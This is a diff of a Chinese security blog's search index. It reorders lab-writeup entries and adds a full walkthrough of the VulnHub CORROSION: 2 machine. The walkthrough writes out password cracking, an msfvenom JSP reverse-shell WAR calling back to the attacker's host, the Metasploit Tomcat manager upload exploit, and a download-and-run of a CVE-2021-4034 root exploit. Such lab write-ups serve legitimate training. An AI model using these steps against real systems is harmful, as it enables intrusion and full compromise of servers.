@@ -698,24 +698,6 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——BSides-Vancouver-2018</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94BSides-Vancouver-2018/</url>
-    <content><![CDATA[<h2 id="web渗透——BSides-Vancouver-2018"><a href="#web渗透——BSides-Vancouver-2018" class="headerlink" title="web渗透——BSides-Vancouver-2018"></a>web渗透——BSides-Vancouver-2018</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004">https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004</a> or pdf</p>
-
-
-	<div class="row">
-    <embed src="BSides-Vancouver-2018.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——AI-WEB1and2</title>
     <url>/2021/12/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94AI-WEB1and2/</url>
     <content><![CDATA[<h2 id="web渗透——AI-WEB1and2"><a href="#web渗透——AI-WEB1and2" class="headerlink" title="web渗透——AI-WEB1and2"></a>web渗透——AI-WEB1and2</h2><h3 id="AI-WEB-1-0"><a href="#AI-WEB-1-0" class="headerlink" title="AI-WEB-1.0"></a>AI-WEB-1.0</h3><p>印象笔记链接:<a href="https://app.yinxiang.com/fx/66c75bd5-a490-44a6-a31d-9f07b671e2ce">https://app.yinxiang.com/fx/66c75bd5-a490-44a6-a31d-9f07b671e2ce</a></p>
@@ -750,6 +732,24 @@
       </categories>
   </entry>
   <entry>
+    <title>web渗透——BSides-Vancouver-2018</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94BSides-Vancouver-2018/</url>
+    <content><![CDATA[<h2 id="web渗透——BSides-Vancouver-2018"><a href="#web渗透——BSides-Vancouver-2018" class="headerlink" title="web渗透——BSides-Vancouver-2018"></a>web渗透——BSides-Vancouver-2018</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004">https://app.yinxiang.com/fx/386f12bb-ce85-49d4-af8e-181023b19004</a> or pdf</p>
+
+
+	<div class="row">
+    <embed src="BSides-Vancouver-2018.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>web渗透——Cysec1-2</title>
     <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Cysec1-2/</url>
     <content><![CDATA[<h2 id="web渗透——Cysec1"><a href="#web渗透——Cysec1" class="headerlink" title="web渗透——Cysec1"></a>web渗透——Cysec1</h2><p>靶机:</p>
@@ -768,13 +768,13 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——Dina-1-0-1</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dina-1-0-1/</url>
-    <content><![CDATA[<h2 id="web渗透——Dina-1-0-1"><a href="#web渗透——Dina-1-0-1" class="headerlink" title="web渗透——Dina-1-0-1"></a>web渗透——Dina-1-0-1</h2><p>靶机:</p>
+    <title>web渗透——Easy_cloudantivirus</title>
+    <url>/2022/01/12/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Easy-cloudantivirus/</url>
+    <content><![CDATA[<h2 id="web渗透——Easy-cloudantivirus"><a href="#web渗透——Easy-cloudantivirus" class="headerlink" title="web渗透——Easy_cloudantivirus"></a>web渗透——Easy_cloudantivirus</h2><p>靶机:</p>
 
 
 	<div class="row">
-    <embed src="Dina-1-0-1.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="easy_cloudantivirus.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -786,13 +786,13 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——Easy_cloudantivirus</title>
-    <url>/2022/01/12/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Easy-cloudantivirus/</url>
-    <content><![CDATA[<h2 id="web渗透——Easy-cloudantivirus"><a href="#web渗透——Easy-cloudantivirus" class="headerlink" title="web渗透——Easy_cloudantivirus"></a>web渗透——Easy_cloudantivirus</h2><p>靶机:</p>
+    <title>web渗透——Dina-1-0-1</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dina-1-0-1/</url>
+    <content><![CDATA[<h2 id="web渗透——Dina-1-0-1"><a href="#web渗透——Dina-1-0-1" class="headerlink" title="web渗透——Dina-1-0-1"></a>web渗透——Dina-1-0-1</h2><p>靶机:</p>
 
 
 	<div class="row">
-    <embed src="easy_cloudantivirus.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="Dina-1-0-1.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -882,25 +882,6 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——My Tomcat HOST:1</title>
-    <url>/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/</url>
-    <content><![CDATA[<h2 id="web渗透——My-Tomcat-HOST-1"><a href="#web渗透——My-Tomcat-HOST-1" class="headerlink" title="web渗透——My Tomcat HOST:1"></a>web渗透——My Tomcat HOST:1</h2><p>pdf</p>
-
-
-	<div class="row">
-    <embed src="tomcat.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-<p><em>注意请在电脑端浏览器查看。</em></p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——Quaoar</title>
     <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Quaoar/</url>
     <content><![CDATA[<h2 id="web渗透——Quaoar"><a href="#web渗透——Quaoar" class="headerlink" title="web渗透——Quaoar"></a>web渗透——Quaoar</h2><center>靶机quaoa</center>
@@ -909,24 +890,6 @@
 
 	<div class="row">
     <embed src="Readme.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>web渗透——SidkOs1.1</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
-    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
-
-
-	<div class="row">
-    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -955,14 +918,15 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——dawn</title>
-    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dawn/</url>
-    <content><![CDATA[<h2 id="web渗透——dawn"><a href="#web渗透——dawn" class="headerlink" title="web渗透——dawn"></a>web渗透——dawn</h2><p>靶机:</p>
+    <title>web渗透——SidkOs1.1</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94SidkOs1-1/</url>
+    <content><![CDATA[<h2 id="web渗透——SidkOs1-1"><a href="#web渗透——SidkOs1-1" class="headerlink" title="web渗透——SidkOs1.1"></a>web渗透——SidkOs1.1</h2><p>映像笔记链接:<a href="https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485">https://app.yinxiang.com/fx/c93e5fe9-4494-4727-810e-3e11655d0485</a> or pdf</p>
 
 
 	<div class="row">
-    <embed src="dawn.pdf" width="100%" height="550" type="application/pdf">
+    <embed src="SidkOs1.1.pdf" width="100%" height="550" type="application/pdf">
 	</div>
+
 
 
 
@@ -979,6 +943,42 @@
 
 	<div class="row">
     <embed src="devguru.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>web渗透——My Tomcat HOST:1</title>
+    <url>/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/</url>
+    <content><![CDATA[<h2 id="web渗透——My-Tomcat-HOST-1"><a href="#web渗透——My-Tomcat-HOST-1" class="headerlink" title="web渗透——My Tomcat HOST:1"></a>web渗透——My Tomcat HOST:1</h2><p>pdf</p>
+
+
+	<div class="row">
+    <embed src="tomcat.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
+<p><em>注意请在电脑端浏览器查看。</em></p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>web渗透——dawn</title>
+    <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94dawn/</url>
+    <content><![CDATA[<h2 id="web渗透——dawn"><a href="#web渗透——dawn" class="headerlink" title="web渗透——dawn"></a>web渗透——dawn</h2><p>靶机:</p>
+
+
+	<div class="row">
+    <embed src="dawn.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -1007,23 +1007,6 @@
       </categories>
   </entry>
   <entry>
-    <title>云服务器配置NPS服务实现内网穿透</title>
-    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
-
-
-	<div class="row">
-    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-]]></content>
-      <categories>
-        <category>内网穿透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——evilscience</title>
     <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94evilscience/</url>
     <content><![CDATA[<h2 id="web渗透——evilscience"><a href="#web渗透——evilscience" class="headerlink" title="web渗透——evilscience"></a>web渗透——evilscience</h2><p>靶机：</p>
@@ -1038,6 +1021,23 @@
 ]]></content>
       <categories>
         <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>云服务器配置NPS服务实现内网穿透</title>
+    <url>/2022/01/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AENPS%E6%9C%8D%E5%8A%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="云服务器配置NPS服务实现内网穿透"><a href="#云服务器配置NPS服务实现内网穿透" class="headerlink" title="云服务器配置NPS服务实现内网穿透"></a>云服务器配置NPS服务实现内网穿透</h2><p>pdf:</p>
+
+
+	<div class="row">
+    <embed src="nps.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>内网穿透</category>
       </categories>
   </entry>
   <entry>
@@ -1406,6 +1406,78 @@
 ]]></content>
       <categories>
         <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vulnhub靶场——CORROSION:2</title>
+    <url>/2022/02/16/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94CORROSION-2/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>攻击机: kali<br><br>靶机： CORROSION: 2 NAT 192.168.91.0 网段<br><br>下载连接:</p>
+<p><a href="https://www.vulnhub.com/entry/corrosion-2,745/">https://www.vulnhub.com/entry/corrosion-2,745/</a></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216125338.png"></p>
+<h2 id="信息搜集与利用"><a href="#信息搜集与利用" class="headerlink" title="信息搜集与利用"></a>信息搜集与利用</h2><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216125939.png"></p>
+<p>如图所示得到目标靶机IP地址: 192.168.91.189</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sV -O -p- -T4 -A 192.168.91.189 –oN corronsion_nmap.txt<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216130401.png"><br><br>如图所示开放了: 22,80(apache2 default),8080(tomcat) 共三个端口，由此可见这个靶机网页由java构成。根据之前做过的tomcat靶机来说，进入 manager 后台，然后上传war包来反弹shell。</p>
+<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p><a href="http://192.168.91.189/">http://192.168.91.189/</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216130650.png"></p>
+<p><a href="http://192.168.91.189:8080/">http://192.168.91.189:8080/</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216130815.png"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><strong>python3 dirsearch.py -u <a href="http://192.168.91.189:8080/">http://192.168.91.189:8080/</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216135924.png"></p>
+<h3 id="可疑文件"><a href="#可疑文件" class="headerlink" title="可疑文件"></a>可疑文件</h3><p>从扫描结果出来有一大堆的东西。其中 docs,examples 这两样是tomcat自带的文档和示例。<br><br>我们来查看一下 readme.txt 和 backup.zip。</p>
+<p><a href="http://192.168.91.189:8080/readme.txt">http://192.168.91.189:8080/readme.txt</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216140423.png"></p>
+<p>其中说到，给了一个谁也找不到的文件（放屁）用密码打开此文件，那么就是指 backup.zip 文件，将其下载下来。</p>
+<p><strong>wget <a href="http://192.168.91.189:8080/backup.zip">http://192.168.91.189:8080/backup.zip</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216140711.png"></p>
+<p><strong>unzip backup.zip</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216140801.png"><br><br>如图所示确实需要密码</p>
+<h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><p><strong>zip2john backup.zip &gt; password_hash.txt</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216141114.png"></p>
+<p><strong>john –wordlist=/usr/share/wordlists/rockyou.txt password_hash.txt</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216141711.png"><br><br>如图所示得到密码:<strong>@administrator_hi5</strong>，很快就出来了。</p>
+<p>现在解压<br><strong>unzip backup.zip</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216141857.png"></p>
+<p>如图所示解压成功，很多文件</p>
+<p>经过一番查找在 tomcat-users.xml 文件最下面发现了用户名和密码:</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216143255.png"></p>
+<p><strong>manager:melehifokivai<br><br>admin:melehifokivai</strong></p>
+<p>这两个用户名都能登陆 tomcat 后台,分别用两个浏览器登陆。<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216143425.png"><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216143451.png"></p>
+<p>既然登陆了后台，我们尝试上传一个 war 包然后反弹shell.</p>
+<p>制作 war 包可以看我以前的博客</p>
+<p><a href="https://www.ohhhhhh.top/2021/12/29/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94My-Tomcat-HOST-1/">https://www.ohhhhhh.top/2021/12/29/web渗透——My-Tomcat-HOST-1/</a></p>
+<p><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.27.243.168 LPORT=4444 -f war &gt; shell.war</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216144155.png"></p>
+<p>kali 开启 nc 监听，然后上传(将 shell.war 拷贝到 win11中)<br><strong>nc -lvnp 4444</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216144635.png"></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216144738.png"></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216145056.png"><br><br>去她娘的 404， 看来这个方法不得行。md</p>
+<p>之后发现 msfconsole 中有一个可以 getshell 的模块配合账号密码即可。<br><strong>use exploit/multi/http/tomcat_mgr_upload</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216152731.png"><br><br>设置红框的内容即可，账号密码在上面已经拿到。<br><br>然后** run **</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216152900.png"><br><br>run 之后，输入 shell 进入 shell 可疑看到为 tomcat 用户。</p>
+<p><strong>python3 -c “import pty;pty.spawn(‘/bin/bash’)”</strong><br><br>输入此命令得到标准的终端</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216153414.png"></p>
+<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h3><p>在目录 <strong>/home/randy</strong> 中有第一个 flag : user.txt</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216153622.png"></p>
+<p><strong>/home/randy/note.txt</strong></p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216153808.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">嘿，兰迪，这是你的系统管理员，希望你今天过得愉快！我只是想让你知道</span><br><span class="line">我更改了你对主目录的权限。您暂时无法删除或添加文件。</span><br><span class="line">稍后我将更改这些权限。</span><br><span class="line">下周一见randy！</span><br></pre></td></tr></table></figure>
+
+<p>查看一下 /etc/passwd 中可存在的用户<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216154406.png"></p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>发现 jaye 用户的密码和 manager 的密码一样都是 ： melehifokivai<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216154901.png"></p>
+<p><strong>find / -perm -u=s -type f 2&gt;/dev/null</strong><br><br>查找 具有 SUID 的命令发现了一个熟悉的: <strong>polkit-agent-helper-1</strong> cve编号:<br><strong>CVE-2021-4034</strong><br><br>exp连接:</p>
+<p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216155352.png"></p>
+<p>发现靶机上没有 git 命令，但是可以用 wget 替代，最后发现还没有 make 命令，那么编译不了，但是我们可以在kali上将已经编译好的文件，下载到靶机中，然后运行,以后遇到类似的直接上传已经编译好的文件。</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216160050.png"></p>
+<p>将编译好的文件下载到靶机中:<br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216162230.png"></p>
+<p><strong>wget <a href="http://172.27.243.168:8000/CVE-2021-4034.zip">http://172.27.243.168:8000/CVE-2021-4034.zip</a></strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216162319.png"><br><br>然后解压<br><strong>unzip CVE-2021-4034.zip</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216162422.png"></p>
+<p>然后进入 <strong>CVE-2021-4034</strong>文件夹，运行 <strong>./cve-2021-4034</strong>,不出意外的话就会拿到 root 权限</p>
+<p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216162724.png"></p>
+<p>如图所示拿到了root 权限，至此又又又通过 CVE-2021-4034 提权成功，不亏是存在了十多年的漏洞!!!</p>
+<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag 2"></a>flag 2</h3><p><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216162826.png"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>jaye:melehifokivai ssh 登陆后，在其家目录下 File 中有 look 命令，可以越权访问文件:<br><strong>./look ‘’ ‘/root/root.txt’</strong><br><img src="https://gitee.com/czheisenberg/blog-imgs/raw/master/imgs/20220216164049.png"><br><br>如图所示直接读取第二个 flag , 如果在比赛中直接提交 flag 即可得分。</p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>参考大佬的博客:</p>
+<p><a href="https://www.cnblogs.com/sainet/p/15668420.html#%E4%B8%89%E6%8F%90%E6%9D%83">https://www.cnblogs.com/sainet/p/15668420.html#三提权</a><br><br>我这里测试失败，可能是我的原因。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>CVE-2021-4034</li>
+<li>look 越权读取文件</li>
+<li>msfconsole use exploit/multi/http/tomcat_mgr_upload getshell</li>
+</ol>
+<center style="display:none !important;visibility:collapse !important;height:0 !important;white-space:nowrap;width:100%;overflow:hidden">%23%23%20%E5%87%86%E5%A4%87%0A%E6%94%BB%E5%87%BB%E6%9C%BA%3A%20kali%0A%E9%9D%B6%E6%9C%BA%EF%BC%9A%20CORROSION%3A%202%20NAT%20192.168.91.0%20%E7%BD%91%E6%AE%B5%0A%E4%B8%8B%E8%BD%BD%E8%BF%9E%E6%8E%A5%3A%0A%5Bhttps%3A%2F%2Fwww.vulnhub.com%2Fentry%2Fcorrosion-2%2C745%2F%5D(https%3A%2F%2Fwww.vulnhub.com%2Fentry%2Fcorrosion-2%2C745%2F)%0A%0A!%5B1%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216125338.png)%0A%0A%23%23%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B8%8E%E5%88%A9%E7%94%A8%0A%23%23%20%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%0A%0A!%5Bip%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216125939.png)%0A%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E5%BE%97%E5%88%B0%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BAIP%E5%9C%B0%E5%9D%80%3A%20192.168.91.189%0A%0A%23%23%23%20%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%0A%20nmap%20-sV%20-O%20-p-%20-T4%20-A%20192.168.91.189%20--oN%20corronsion_nmap.txt%0A!%5Bnmap%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216130401.png)%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E5%BC%80%E6%94%BE%E4%BA%86%3A%2022%2C80(apache2%20default)%2C8080(tomcat)%20%E5%85%B1%E4%B8%89%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%8C%E7%94%B1%E6%AD%A4%E5%8F%AF%E8%A7%81%E8%BF%99%E4%B8%AA%E9%9D%B6%E6%9C%BA%E7%BD%91%E9%A1%B5%E7%94%B1java%E6%9E%84%E6%88%90%E3%80%82%E6%A0%B9%E6%8D%AE%E4%B9%8B%E5%89%8D%E5%81%9A%E8%BF%87%E7%9A%84tomcat%E9%9D%B6%E6%9C%BA%E6%9D%A5%E8%AF%B4%EF%BC%8C%E8%BF%9B%E5%85%A5%20manager%20%E5%90%8E%E5%8F%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E4%B8%8A%E4%BC%A0war%E5%8C%85%E6%9D%A5%E5%8F%8D%E5%BC%B9shell%E3%80%82%0A%0A%23%23%23%20HTTP%0A%5Bhttp%3A%2F%2F192.168.91.189%2F%5D(http%3A%2F%2F192.168.91.189%2F)%0A!%5Bhttp%3A80%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216130650.png)%0A%5Bhttp%3A%2F%2F192.168.91.189%3A8080%2F%5D(http%3A%2F%2F192.168.91.189%3A8080%2F)%0A!%5Bhttp%3A8080%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216130815.png)%0A%0A%23%23%23%20%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%0A%0A**python3%20dirsearch.py%20-u%20http%3A%2F%2F192.168.91.189%3A8080%2F**%0A!%5Bdirsearch%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216135924.png)%0A%0A%23%23%23%20%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6%0A%E4%BB%8E%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E5%87%BA%E6%9D%A5%E6%9C%89%E4%B8%80%E5%A4%A7%E5%A0%86%E7%9A%84%E4%B8%9C%E8%A5%BF%E3%80%82%E5%85%B6%E4%B8%AD%20docs%2Cexamples%20%E8%BF%99%E4%B8%A4%E6%A0%B7%E6%98%AFtomcat%E8%87%AA%E5%B8%A6%E7%9A%84%E6%96%87%E6%A1%A3%E5%92%8C%E7%A4%BA%E4%BE%8B%E3%80%82%0A%E6%88%91%E4%BB%AC%E6%9D%A5%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%20readme.txt%20%E5%92%8C%20backup.zip%E3%80%82%0A%0A%5Bhttp%3A%2F%2F192.168.91.189%3A8080%2Freadme.txt%5D(http%3A%2F%2F192.168.91.189%3A8080%2Freadme.txt)%0A!%5Breadme.txt%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216140423.png)%0A%0A%E5%85%B6%E4%B8%AD%E8%AF%B4%E5%88%B0%EF%BC%8C%E7%BB%99%E4%BA%86%E4%B8%80%E4%B8%AA%E8%B0%81%E4%B9%9F%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%88%E6%94%BE%E5%B1%81%EF%BC%89%E7%94%A8%E5%AF%86%E7%A0%81%E6%89%93%E5%BC%80%E6%AD%A4%E6%96%87%E4%BB%B6%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E6%98%AF%E6%8C%87%20backup.zip%20%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E5%85%B6%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E3%80%82%0A%0A**wget%20http%3A%2F%2F192.168.91.189%3A8080%2Fbackup.zip**%0A!%5Bbackup%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216140711.png)%0A%0A**unzip%20backup.zip**%0A!%5Bunzip%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216140801.png)%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E7%A1%AE%E5%AE%9E%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81%0A%0A%23%23%23%23%20%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%0A**zip2john%20backup.zip%20%3E%20password_hash.txt**%0A!%5Bpassword_hash.txt%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216141114.png)%0A%0A**john%20--wordlist%3D%2Fusr%2Fshare%2Fwordlists%2Frockyou.txt%20password_hash.txt**%0A%0A!%5Bpass%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216141711.png)%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%3A**%40administrator_hi5**%EF%BC%8C%E5%BE%88%E5%BF%AB%E5%B0%B1%E5%87%BA%E6%9D%A5%E4%BA%86%E3%80%82%0A%0A%E7%8E%B0%E5%9C%A8%E8%A7%A3%E5%8E%8B%0A**unzip%20backup.zip**%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216141857.png)%0A%0A%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E8%A7%A3%E5%8E%8B%E6%88%90%E5%8A%9F%EF%BC%8C%E5%BE%88%E5%A4%9A%E6%96%87%E4%BB%B6%0A%0A%E7%BB%8F%E8%BF%87%E4%B8%80%E7%95%AA%E6%9F%A5%E6%89%BE%E5%9C%A8%20tomcat-users.xml%20%E6%96%87%E4%BB%B6%E6%9C%80%E4%B8%8B%E9%9D%A2%E5%8F%91%E7%8E%B0%E4%BA%86%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%3A%0A%0A!%5B%5D(https%3A%2F%2Fgitee.com%2Fczheisenberg%2Fblog-imgs%2Fraw%2Fmaster%2Fimgs%2F20220216143255.